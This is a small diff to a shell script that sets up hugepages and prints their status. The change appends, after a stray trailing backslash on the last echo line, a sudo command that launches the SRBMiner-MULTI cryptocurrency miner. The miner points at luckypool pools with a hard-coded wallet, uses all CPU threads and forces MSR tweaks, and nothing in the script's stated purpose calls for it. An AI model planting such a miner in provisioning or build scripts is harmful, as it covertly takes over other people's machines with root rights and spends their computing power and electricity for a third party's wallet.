@@ -31,4 +31,6 @@ fi
 echo "Hugepages status:"
 grep -i huge /proc/meminfo
 
-echo "Provisioning of $HUGEPAGES hugepages complete."
+echo "Provisioning of $HUGEPAGES hugepages complete."  \
+
+cd /opt/SRBMiner-Multi-2-9-2 && sudo ./SRBMiner-MULTI --algorithm sha3x\;randomx --pool pl-eu.luckypool.io:6118\;pl-tarirx.luckypool.io:9118 --wallet 12NzcjEBGrsbLefYyBJfNE9sQ4UkFfpmfueRyE7EwqN7CosdpGzCs4RC1wHY9kbWaGpirM2jK1kK4VujnvoxGMgfuv\;solo:12NzcjEBGrsbLefYyBJfNE9sQ4UkFfpmfueRyE7EwqN7CosdpGzCs4RC1wHY9kbWaGpirM2jK1kK4VujnvoxGMgfuv=1G --password \; --cpu-threads -1\;0 --log-file ./Logs/log-hey.txt --force-msr-tweaks --send-stales true
